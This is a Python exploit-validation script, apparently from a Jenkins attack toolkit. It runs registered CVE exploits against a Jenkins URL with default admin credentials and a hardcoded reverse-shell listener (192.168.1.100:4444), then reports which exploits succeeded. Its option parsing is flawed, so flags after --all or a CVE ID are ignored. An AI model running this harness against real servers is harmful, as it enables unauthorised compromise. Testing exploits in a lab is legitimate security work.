#!/usr/bin/env python3
"""
Exploit Validation Framework
Automatically tests exploits against Jenkins instances
"""

import sys
import time
from pathlib import Path
from typing import Any, Optional

try:
    from jenkins_breaker.modules.base import exploit_registry, ExploitModule
    from jenkins_breaker.core.session import JenkinsSession, SessionConfig
except ImportError:
    print("[!] Error: JenkinsBreaker modules not found. Run from project root.")
    sys.exit(1)


class ExploitValidator:
    """Validates exploit modules against live Jenkins instances."""

    def __init__(
        self,
        jenkins_url: str = "http://localhost:8080",
        username: str = "admin",
        password: str = "admin"
    ):
        """
        Initialize the validator.
        
        Args:
            jenkins_url: Target Jenkins URL
            username: Jenkins username
            password: Jenkins password
        """
        self.jenkins_url = jenkins_url
        self.username = username
        self.password = password

    def validate_exploit(self, cve_id: str) -> dict[str, Any]:
        """
        Validate a single exploit against the target.
        
        Args:
            cve_id: CVE identifier to validate
            
        Returns:
            Validation results dictionary
        """
        results = {
            'cve_id': cve_id,
            'check_vulnerable': False,
            'exploit_success': False,
            'shell_spawned': False,
            'errors': [],
            'warnings': [],
            'execution_time': 0.0
        }
        
        start_time = time.time()
        
        try:
            config = SessionConfig(
                url=self.jenkins_url,
                username=self.username,
                password=self.password
            )
            session = JenkinsSession(config)
            
            exploit = exploit_registry.get(cve_id)
            if not exploit:
                results['errors'].append(f"Exploit {cve_id} not found in registry")
                return results
            
            try:
                is_vuln = exploit.check_vulnerable(session)
                results['check_vulnerable'] = True
                
                if not is_vuln:
                    results['warnings'].append("check_vulnerable() returned False")
            except Exception as e:
                results['errors'].append(f"check_vulnerable() failed: {str(e)}")
            
            try:
                result = exploit.run(session, lhost="192.168.1.100", lport=4444)
                
                if result.status == "success":
                    results['exploit_success'] = True
                elif result.status == "error":
                    results['errors'].append(f"Exploit returned error: {result.details}")
                else:
                    results['warnings'].append(f"Exploit returned status: {result.status}")
                    
            except Exception as e:
                results['errors'].append(f"Exploit execution failed: {str(e)}")
            
        except Exception as e:
            results['errors'].append(f"Session creation failed: {str(e)}")
        
        results['execution_time'] = time.time() - start_time
        
        return results

    def validate_all_exploits(self) -> list[dict[str, Any]]:
        """
        Validate all registered exploits.
        
        Returns:
            List of validation results
        """
        results = []
        all_exploits = exploit_registry.list_cves()
        
        print(f"[*] Validating {len(all_exploits)} exploits against {self.jenkins_url}")
        print()
        
        for i, cve_id in enumerate(all_exploits, 1):
            print(f"[{i}/{len(all_exploits)}] Validating {cve_id}...", end=' ')
            result = self.validate_exploit(cve_id)
            results.append(result)
            
            if result['exploit_success']:
                print("[+] PASSED")
            elif result['errors']:
                print("[!] FAILED")
            else:
                print("[-] SKIPPED")
        
        return results

    def generate_report(self, results: list[dict[str, Any]]) -> None:
        """
        Generate a validation report.
        
        Args:
            results: List of validation results
        """
        total = len(results)
        passed = sum(1 for r in results if r['exploit_success'])
        failed = sum(1 for r in results if r['errors'])
        skipped = total - passed - failed
        
        print()
        print("=" * 70)
        print("VALIDATION REPORT")
        print("=" * 70)
        print()
        print(f"Total Exploits:  {total}")
        print(f"Passed:          {passed}")
        print(f"Failed:          {failed}")
        print(f"Skipped:         {skipped}")
        print(f"Success Rate:    {(passed/total*100) if total > 0 else 0:.1f}%")
        print()
        print("=" * 70)
        print()
        
        if passed > 0:
            print("PASSED EXPLOITS:")
            for result in results:
                if result['exploit_success']:
                    print(f"  [+] {result['cve_id']} ({result['execution_time']:.2f}s)")
            print()
        
        if failed > 0:
            print("FAILED EXPLOITS:")
            for result in results:
                if result['errors']:
                    print(f"  [!] {result['cve_id']}")
                    for error in result['errors']:
                        print(f"      - {error}")
            print()
        
        if any(r.get('warnings') for r in results):
            print("WARNINGS:")
            for result in results:
                if result.get('warnings'):
                    print(f"  [*] {result['cve_id']}")
                    for warning in result['warnings']:
                        print(f"      - {warning}")
            print()

    def save_report(self, results: list[dict[str, Any]], output_file: str) -> None:
        """
        Save validation report to file.
        
        Args:
            results: List of validation results
            output_file: Output file path
        """
        import json
        
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'target': self.jenkins_url,
            'total': len(results),
            'passed': sum(1 for r in results if r['exploit_success']),
            'failed': sum(1 for r in results if r['errors']),
            'results': results
        }
        
        Path(output_file).write_text(json.dumps(report, indent=2))
        print(f"[+] Report saved to {output_file}")


def main():
    """CLI interface for validation tool."""
    if len(sys.argv) < 2:
        print("JenkinsBreaker Exploit Validator")
        print()
        print("Usage:")
        print("  python -m jenkins_breaker.tools.validator <CVE-ID>")
        print("  python -m jenkins_breaker.tools.validator --all")
        print("  python -m jenkins_breaker.tools.validator --all --url <URL> --user <USER> --pass <PASS>")
        print()
        print("Examples:")
        print("  python -m jenkins_breaker.tools.validator CVE-2024-12345")
        print("  python -m jenkins_breaker.tools.validator --all")
        print("  python -m jenkins_breaker.tools.validator --all --url http://jenkins:8080")
        print()
        sys.exit(1)
    
    jenkins_url = "http://localhost:8080"
    username = "admin"
    password = "admin"
    output_file = None
    
    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        
        if arg == "--url" and i + 1 < len(sys.argv):
            jenkins_url = sys.argv[i + 1]
            i += 2
        elif arg == "--user" and i + 1 < len(sys.argv):
            username = sys.argv[i + 1]
            i += 2
        elif arg == "--pass" and i + 1 < len(sys.argv):
            password = sys.argv[i + 1]
            i += 2
        elif arg == "--output" and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]
            i += 2
        else:
            break
    
    validator = ExploitValidator(jenkins_url, username, password)
    
    if sys.argv[1] == "--all":
        results = validator.validate_all_exploits()
        validator.generate_report(results)
        
        if output_file:
            validator.save_report(results, output_file)
    
    else:
        cve_id = sys.argv[1]
        result = validator.validate_exploit(cve_id)
        validator.generate_report([result])
        
        if output_file:
            validator.save_report([result], output_file)


if __name__ == "__main__":
    main()
